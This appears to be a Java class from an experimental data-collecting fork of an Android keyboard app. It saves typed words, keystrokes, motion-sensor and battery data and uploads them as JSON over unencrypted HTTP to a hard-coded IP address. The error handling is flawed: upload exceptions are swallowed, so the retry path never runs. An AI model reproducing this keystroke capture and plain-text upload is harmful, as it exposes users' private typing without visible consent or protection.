package com.anysoftkeyboard.datacollection;


import android.content.Context;
import android.net.TrafficStats;
import android.os.Build;
import android.support.annotation.RequiresApi;

import com.anysoftkeyboard.base.utils.Logger;
import com.anysoftkeyboard.datacollection.database.dao.FileInfoDao;
import com.anysoftkeyboard.datacollection.database.model.FileInfo;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.net.ConnectException;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.UUID;


import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import static com.anysoftkeyboard.base.Charsets.UTF8;

public class DataTransmitter implements Runnable {

    private Context context;
    private DataCollection dataCollection;
    private FileInfoDao fileInfoDao;

    public DataTransmitter(Context context, DataCollection dataCollection) {
        this.context = context;
        this.dataCollection = dataCollection;
        fileInfoDao = new FileInfoDao(context);
    }


    /**
     * This method save the data from DataCollection as file
     */
    @RequiresApi(api = Build.VERSION_CODES.O)
    private void saveData(FileInfo fileInfo) throws IOException {

        File file = new File(this.context.getFilesDir(), fileInfo.getFileName());
        BufferedWriter writer = Files.newBufferedWriter(file.toPath(), UTF8);
        writer.write(this.dataCollection.toJsonString());
        writer.close();

        //Test reading

    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private String readData(FileInfo fileInfo) throws IOException {
        File file = new File(this.context.getFilesDir(), fileInfo.getFileName());
        BufferedReader reader = Files.newBufferedReader(file.toPath(), UTF8);
        String result = reader.readLine();
        Logger.d("test", "dc-- DataTransmitter read in string length=%d", reader.readLine().length());
        Logger.d("test", "dc-- DataTransmitter actual string length=%d", this.dataCollection.getKeystrokes().toString().length() + this.dataCollection.getWords().toString().length());
        reader.close();
        return result;
    }

    /**
     * This method perform the transmit file process, please refer the activity diagram of transmit file process
     */
    @Override
    @RequiresApi(api = Build.VERSION_CODES.O)
    public void run() {
        TrafficStats.setThreadStatsTag((int) Thread.currentThread().getId());
//        transmitProcess();
        experimentProcess();
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void transmitProcess() {
        boolean findAllFileInfo = true;

        //create a file info data
        FileInfo fileInfo = new FileInfo(UUID.randomUUID().toString(), dataCollection.toString().length());

        //try to save the data collection object as file first
        //then upload the file, finally delete it
        try {
            saveData(fileInfo);
            Logger.d(this.getClass().getName(), "dc-- DataTransmitter file saved");
            uploadFile(fileInfo);
            Logger.d(this.getClass().getName(), "dc-- DataTransmitter file uploaded");
            //upload another file for battery after uploading first file
            BatteryInfo batteryInfo = new BatteryInfo();
            batteryInfo.setBatterLevel(BatteryInfo.getBatteryLevel(context));
            batteryInfo.setBatteryPercentage(BatteryInfo.getBatteryPercentage(context));
            dataCollection.setBatteryInfo(batteryInfo);
            // uploadFile(dataCollection);


            if (deleteFile(fileInfo)) {
                Logger.d(this.getClass().getName(), "dc-- DataTransmitter file deleted");
            }


        } catch (ConnectException e) {
            Logger.d(this.getClass().getName(), "dc-- DataTransmitter file cannot be uploaded due to some reasons.");
            //something happen with internet connection, do not need to upload unuploaded files.
            findAllFileInfo = false;
            //save the file record into database
            fileInfoDao.open();
            fileInfoDao.insert(fileInfo);
            fileInfoDao.close();

        } catch (IOException e) {
            // if exception occur when saving the file
            // save the file record into database
            Logger.w(this.getClass().getName(), "dc-- DataTransmitter file cannot be saved as file, will not save this file. ");
            findAllFileInfo = true; //still need to check all unuploaded files and try to upload them

        } finally {
            //find all unuploaded files and try to upload them.
            if (findAllFileInfo) {
                fileInfoDao.open();
                ArrayList<FileInfo> fileInfos = fileInfoDao.findAllFileInfoByHasSent(false);
                Logger.d(this.getClass().getName(), "dc-- DataTransmitter (file) loop size = %d", fileInfos.size());
                try {
                    for (FileInfo file : fileInfos) {
                        //upload the file
                        uploadFile(file);
                        Logger.d(this.getClass().getName(), "dc-- DataTransmitter file uploaded");
                        // delete the file it self
                        if (deleteFile(file)) {
                            //delete the file in database
                            fileInfoDao.deleteFileInfo(file);
                            Logger.d(this.getClass().getName(), "dc-- DataTransmitter file delete success");
                        }
                    }

                } catch (ConnectException e) {
                    Logger.d(this.getClass().getName(), "dc-- DataTransmitter file cannot be uploaded due to some reasons. for loop exist");

                } finally {
                    Logger.d(this.getClass().getName(), "dc-- DataTransmitter fileDao close.");
                    fileInfoDao.close();
                }
            }
        }
    }

    /**
     * Upload the file to backend server
     *
     * @param fileInfo file information
     * @throws ConnectException internet connection exception
     */
    private void uploadFile(FileInfo fileInfo) throws ConnectException {
        RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), dataCollection.toJsonString());
        Request request = new Request.Builder().url("http://52.170.32.197/saveKeyboard").post(body).build();
        OkHttpClient client = new OkHttpClient();
        try{
            Response response = client.newCall(request).execute();

        }catch (Exception e){

        }

    }


    /**
     * delete the file on disk. return true if delete success
     *
     * @param fileInfo file information
     * @return return true if delete success
     * *
     */
    private boolean deleteFile(FileInfo fileInfo) {
        File file = new File(this.context.getFilesDir(), fileInfo.getFileName());
        return file.delete();
    }

    /**
     * this process is for experiment
     */
    @RequiresApi(api = Build.VERSION_CODES.O)
    private void experimentProcess() {
        boolean findAllFileInfo = true;

        //create a file info data
        FileInfo fileInfo = new FileInfo(UUID.randomUUID().toString(), dataCollection.toString().length());

        //try to save the data collection object as file first
        //then upload the file, finally delete it
        try {
            saveData(fileInfo);
            Logger.d(this.getClass().getName(), "dc-- DataTransmitter file saved");
            uploadFile(fileInfo);
            Logger.d(this.getClass().getName(), "dc-- DataTransmitter file uploaded");
            //upload another file for battery after uploading first file
            BatteryInfo batteryInfo = new BatteryInfo();
            batteryInfo.setBatterLevel(BatteryInfo.getBatteryLevel(context));
            batteryInfo.setBatteryPercentage(BatteryInfo.getBatteryPercentage(context));
            dataCollection.setBatteryInfo(batteryInfo);
            dataCollection.setWords(null);
            dataCollection.setKeystrokes(null);
            dataCollection.setRateOfRotation(null);
            dataCollection.setAcceleration(null);
            uploadFile(fileInfo);
            Logger.d(this.getClass().getName(), "dc-- DataTransmitter battery file uploaded");


            if (deleteFile(fileInfo)) {
                Logger.d(this.getClass().getName(), "dc-- DataTransmitter file deleted");
            }


        } catch (ConnectException e) {
            Logger.d(this.getClass().getName(), "dc-- DataTransmitter file cannot be uploaded due to some reasons.");
            //something happen with internet connection, do not need to upload unuploaded files.
            findAllFileInfo = false;
            //save the file record into database
            fileInfoDao.open();
            fileInfoDao.insert(fileInfo);
            fileInfoDao.close();

        } catch (IOException e) {
            // if exception occur when saving the file
            // save the file record into database
            Logger.w(this.getClass().getName(), "dc-- DataTransmitter file cannot be saved as file, will not save this file. ");
            findAllFileInfo = true; //still need to check all unuploaded files and try to upload them

        } finally {
            //find all unuploaded files and try to upload them.
            if (findAllFileInfo) {
                fileInfoDao.open();
                ArrayList<FileInfo> fileInfos = fileInfoDao.findAllFileInfoByHasSent(false);
                Logger.d(this.getClass().getName(), "dc-- DataTransmitter (file) loop size = %d", fileInfos.size());
                try {
                    for (FileInfo file : fileInfos) {
                        //upload the file
                        uploadFile(file);
                        Logger.d(this.getClass().getName(), "dc-- DataTransmitter file uploaded");
                        // delete the file it self
                        if (deleteFile(file)) {
                            //delete the file in database
                            fileInfoDao.deleteFileInfo(file);
                            Logger.d(this.getClass().getName(), "dc-- DataTransmitter file delete success");
                        }
                    }

                } catch (ConnectException e) {
                    Logger.d(this.getClass().getName(), "dc-- DataTransmitter file cannot be uploaded due to some reasons. for loop exist");

                } finally {
                    Logger.d(this.getClass().getName(), "dc-- DataTransmitter fileDao close.");
                    fileInfoDao.close();
                }
            }
        }
    }
}
